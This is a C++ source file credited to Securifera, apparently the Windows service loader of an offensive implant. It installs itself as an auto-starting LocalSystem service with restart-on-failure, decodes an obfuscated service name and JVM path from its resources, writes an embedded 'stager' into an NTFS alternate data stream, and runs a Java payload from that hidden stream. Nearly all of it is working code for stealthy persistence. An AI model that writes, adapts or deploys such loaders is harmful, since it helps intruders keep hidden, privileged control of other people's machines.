//***************************************************************
/*  Author: Securifera
/   Description: 
/           This application sets up and runs the java application
/   as a service.
/
/
/
*/
//****************************************************************

#pragma once

#include "svc.h"
#include "..\JAR_Loader\jarldr.h"
#include "..\log.h"
#include "..\utilities.h"
#include <ShlObj.h>

HANDLE stopEvent;

#ifdef _DBG
#pragma comment(lib, "Shell32.lib")		
#endif

//
//	The main entry point 
//
int main(int argc, char* argv[]){

#ifdef _DBG
	CHAR path[MAX_PATH];
	if ( SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, path) == S_OK ) {
		std::string str_path(path);
		str_path.append("\\jldr.log");
		SetLogPath(str_path.c_str());
	}
#endif

	std::string serviceName;
	std::string serviceDescription;
	
	if(argc == 1) {

		//Get the service name
	    ReadServiceName(&serviceName);

		//Log error
		if( serviceName.empty() ){
#ifdef _DBG
			Log("Unable to start service.  No service name.");
#endif
			return 1;
		}

        //Read the service description if it's set
	    ReadServiceDescription( &serviceDescription );	

		
		//Install in the registry, if it works, exit
		if( InstallService( serviceName.c_str(), serviceDescription.c_str() ) )
			return 0;

		//Service Entry;
		SERVICE_TABLE_ENTRY	lpServiceStartTable[] = {
			{ (LPSTR)serviceName.c_str(), ServiceMain},
			{0, 0}
		};

		//Services.exe launches this process without any params
		if(!StartServiceCtrlDispatcher(lpServiceStartTable)) {
#ifdef _DBG
			Log("StartServiceCtrlDispatcher failure, error code = %d\n", GetLastError());
#endif
		}

	}


}

////=========================================================================
///**
//	Extract the stager and write to ADS
//*/
//void ExtractStager( char* passedPath ){
//
//    HGLOBAL hResourceLoaded;  // handle to loaded resource
//    HRSRC   hRes;              // handle/ptr to res. info.
//    char    *lpResLock;        // pointer to resource data
//    DWORD   dwSizeRes;
//    std::string strOutputLocation;
//    std::string strAppLocation;
//		
//	//Get the resource
//	hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1) ,"BIN");
//
//    hResourceLoaded = LoadResource(NULL, hRes);
//    lpResLock = (char *) LockResource(hResourceLoaded);
//    dwSizeRes = SizeofResource(NULL, hRes);
//
//	DWORD dwRet = 0;
//	std::string classPath = passedPath;
//	classPath.append(COLON);
//
//	HANDLE hStream = CreateFile( classPath.c_str(), GENERIC_WRITE,
//                             FILE_SHARE_WRITE, NULL,
//                             OPEN_ALWAYS, 0, NULL );
//
//    if( hStream != INVALID_HANDLE_VALUE ){
//         WriteFile(hStream, lpResLock, dwSizeRes, &dwRet, NULL);
//		CloseHandle(hStream);
//	}
//
//}

//=========================================================================
/**
	Attempt to get the service name embedded in the file
*/
void ReadServiceName( std::string* svcName ) {	
	char serviceName[MAX_PATH];
	LoadString(NULL, IDS_SVC_NAME, serviceName, MAX_PATH );	

	//Deobfuscate it
	char *reg_ptr = decode_split(serviceName, 200);
	svcName->assign(reg_ptr);
	free(reg_ptr);
}

//=========================================================================
/**
	Attempt to get the service description embedded in the file
*/
void ReadServiceDescription( std::string* svcDesc ) {	
	char serviceDesc[MAX_PATH];
	LoadString(NULL, IDS_DESCRIPTION, serviceDesc, MAX_PATH );	

	//Deobfuscate it
	char *tmp_ptr = decode_split(serviceDesc, 200);
	svcDesc->assign(tmp_ptr);
	free(tmp_ptr);
}

//=========================================================================
/**
	Attempt to get the java path embedded in the file
*/
void ReadJavaPath( std::string* passedPath ) {	
	//char javaPath[MAX_PATH];
	//LoadString(NULL, IDS_PATH, javaPath, MAX_PATH );	

	////Deobfuscate it
	//char *tmp_ptr = decode_split(javaPath, 200);
	//passedPath->assign(tmp_ptr);
	//free(tmp_ptr);

	//Get jvm string from resource table
	char jvm_buf[400];
	LoadString(NULL, IDS_JVM_PATH, jvm_buf, 400);
	if( strlen( jvm_buf ) != 0 ){

		//Deobfuscate it
		char *jvm_ptr = decode_split(jvm_buf, 400);
		passedPath->assign(jvm_ptr);
		free(jvm_ptr);
	}
}


//=========================================================================
/**
	Installs the service
*/
bool InstallService( const char* serviceName, const char* serviceDesc ){

	char pPath[MAX_PATH];
	bool installed_svc = false;
	SERVICE_STATUS status;

	ZeroMemory(pPath, MAX_PATH);
	GetModuleFileName(NULL, pPath, MAX_PATH-1);
	SERVICE_DESCRIPTION sd;
	
	//Set the description
	sd.lpDescription = (LPSTR)serviceDesc;
	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE); 
	if (schSCManager==0) {
		printf_s("OpenSCManager failed, error code = %d\n", GetLastError());
	} else {

		SC_HANDLE service = OpenService(schSCManager, serviceName, SERVICE_ALL_ACCESS);
		if (service == NULL){		

			SC_HANDLE schService = CreateService	( 
				schSCManager,	/* SCManager database      */ 
				serviceName,			/* name of service         */ 
				serviceName,			/* service name to display */ 
				SERVICE_ALL_ACCESS,        /* desired access          */ 
				SERVICE_WIN32_OWN_PROCESS, /* service type            */ 
				SERVICE_AUTO_START,      /* start type              */ 
				SERVICE_ERROR_NORMAL,      /* error control type      */ 
				pPath,			        /* service's binary        */ 
				NULL,                      /* no load ordering group  */ 
				NULL,                      /* no tag identifier       */ 
				NULL,                      /* no dependencies         */ 
				NULL,                      /* LocalSystem account     */ 
				NULL					/* no password             */ 
			);                     

			if (schService==0) {
#ifdef _DBG
				Log( "Create Service failure, error code = %d\n", GetLastError());
#endif
			} else {

				//Log( "Service %s installed\n", SERVICE_NAME);
				ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &sd);

				//Set an action for when it fails
				SERVICE_FAILURE_ACTIONS sfa;
				SC_ACTION failActions[3];

				failActions[0].Type = SC_ACTION_RESTART; //Failure action: Restart Service
				failActions[0].Delay = 60000; //number of seconds to wait before performing failure action, in milliseconds = 2minutes
				failActions[1].Type = SC_ACTION_RESTART;
				failActions[1].Delay = 60000;
				failActions[2].Type = SC_ACTION_NONE;
				failActions[2].Delay = 60000;

				sfa.dwResetPeriod = INFINITE;
				sfa.lpCommand = NULL;
				sfa.lpRebootMsg = NULL;
				sfa.cActions = 3;
				sfa.lpsaActions = failActions;

				ChangeServiceConfig2(schService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);

				// Start the service:
				if (!StartService(schService, 0, NULL))
				{
					DWORD err = GetLastError();
					if (err == ERROR_SERVICE_ALREADY_RUNNING)
					{
						SetLastError(0);
					}
					else
					{
						#ifdef _DBG
							Log("[-] Unable to start service.\n"); 
						#endif
						// Failed to start service; clean-up:
						ControlService(service, SERVICE_CONTROL_STOP, &status);
						DeleteService(service);
						CloseServiceHandle(service);
						service = NULL;
						SetLastError(err);
					}
				}

				installed_svc = true;
			}
		}
		
		CloseServiceHandle(schSCManager);
	}	

	return installed_svc;
}

//=========================================================================
/**
	Uninstalls the service
*/
void UnInstall(){

	std::string serviceName;

	//Get the service name
	ReadServiceName(&serviceName);

	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS); 
	if (schSCManager==0) {

		//printf_s( "OpenSCManager failed, error code = %d\n", GetLastError());

	} else {
		SC_HANDLE schService = OpenService( schSCManager, serviceName.c_str(), SERVICE_ALL_ACCESS);
		if (schService==0) {

			long nError = GetLastError();
			//printf_s("OpenService failed, error code = %d\n", nError);

		} else	{

			if(!DeleteService(schService)) {
				printf_s("Failed to delete service %s\n", serviceName);
			} else {
				printf_s("Service %s removed\n",serviceName);
			}
			CloseServiceHandle(schService); 
		}
		CloseServiceHandle(schSCManager);	
	}

}

//=========================================================================
/**
	Service Main
*/
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv) {

	std::string serviceName;

	//Get the service name
	ReadServiceName(&serviceName);

	HANDLE handleArray[2];
	stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if(stopEvent == NULL) {
#ifdef _DBG
		Log("CreateEvent failed, error code = %d\n", GetLastError());
#endif
		return;
	}

	//Register Service Handler call back that responds start , stop commands 
    hServiceStatusHandle = RegisterServiceCtrlHandler(serviceName.c_str(), ServiceHandler); 
    if (hServiceStatusHandle==0) {
#ifdef _DBG
		Log("RegisterServiceCtrlHandler failed, error code = %d\n", GetLastError());
#endif
        return; 
    } 

	if(!SetTheServiceStatus(SERVICE_START_PENDING)) {
		return;
	}

	//Call the java class main method in a separate thread
	handleArray[0] = CreateThread( 
           NULL,              // default security attributes
           0,                 // use default stack size  
           InvokeMainWrapper,        // thread function 
           0,             // argument to thread function 
           0,                 // use default creation flags 
           0);   // returns the thread identifier 
	
	if(!SetTheServiceStatus(SERVICE_RUNNING)) {
		return;
	}

	//Wait for stopEvent
	//WaitForSingleObject(ahandle, INFINITE);

	handleArray[1] = stopEvent;
	WaitForMultipleObjects(2, handleArray, FALSE, INFINITE);
	
	if(!SetTheServiceStatus(SERVICE_STOPPED)) { 
#ifdef _DBG
		Log("SetServiceStatus failed, error code = %d\n", GetLastError());
#endif
	} 

	if(stopEvent != NULL) {
		CloseHandle(stopEvent);
	}
	
}

//=========================================================================
/**
	The service handler
*/
void WINAPI ServiceHandler(DWORD fdwControl) {
	HANDLE hThread;

	switch(fdwControl) 	{
		case SERVICE_CONTROL_STOP:
		case SERVICE_CONTROL_SHUTDOWN:
			//Create a separate shutdown thread and wait for the thread to 
			//gracefully shutdown with in a timeout of 20 seconds
			SetTheServiceStatus(SERVICE_STOP_PENDING);
			hThread = CreateThread( 
				NULL,              // default security attributes
				0,                 // use default stack size  
				InvokeShutdownWrapper,        // thread function 
				0,             // argument to thread function 
				0,                 // use default creation flags 
				0);   // returns the thread identifier 

			WaitForSingleObject(hThread, SHUTDOWN_TIMEOUT); 
			SetEvent(stopEvent);
			break; 
		case SERVICE_CONTROL_PAUSE:
			SetTheServiceStatus(SERVICE_PAUSED);
			break;
		default:
			SetTheServiceStatus(SERVICE_RUNNING);
			break;
	};
}

//=========================================================================
/**
	Main Java Entry Point
*/
DWORD WINAPI InvokeMainWrapper(LPVOID lpParam ) {
	
	std::string serviceName;

	//Get the service name
	ReadServiceName(&serviceName);

	char pPath[MAX_PATH];
	//Get the path to the binary
	ZeroMemory(pPath, MAX_PATH);
	GetModuleFileName(NULL, pPath, MAX_PATH-1);

	//Extract and write to ADS
	std::string adsPath;
	adsPath.assign(pPath);
	adsPath.append(COLON);

	//Check if the ADS exists
	DWORD fileAttr = GetFileAttributes(adsPath.c_str());
    if (0xFFFFFFFF == fileAttr){
#ifdef _DBG
		Log( "Stager doesn't exist, extracting from binary.\r\n");
#endif
		ExtractStager( adsPath );
	}

	//Get Java path
	std::string jvmPath;
	ReadJavaPath( &jvmPath );

	//Call main
	if( !InvokeMain( &serviceName, adsPath, jvmPath.c_str() ))
		SetEvent(stopEvent);

	return 0;

}

//=========================================================================
/**
	Shutdown method
*/
DWORD WINAPI InvokeShutdownWrapper( LPVOID lpParam ) {
    
	InvokeShutdown();

	return 0;
}

//=========================================================================
/**
	Sets the service status
*/
BOOL SetTheServiceStatus(DWORD dwStatus) {
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP |  SERVICE_ACCEPT_SHUTDOWN /*| SERVICE_ACCEPT_PAUSE_CONTINUE*/; 
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCurrentState       = dwStatus; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0;  
    if(!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) { 
#ifdef _DBG
		Log("SetServiceStatus failure, error code = %d\n", GetLastError());
#endif
		return FALSE;
    } 
	return TRUE;
}
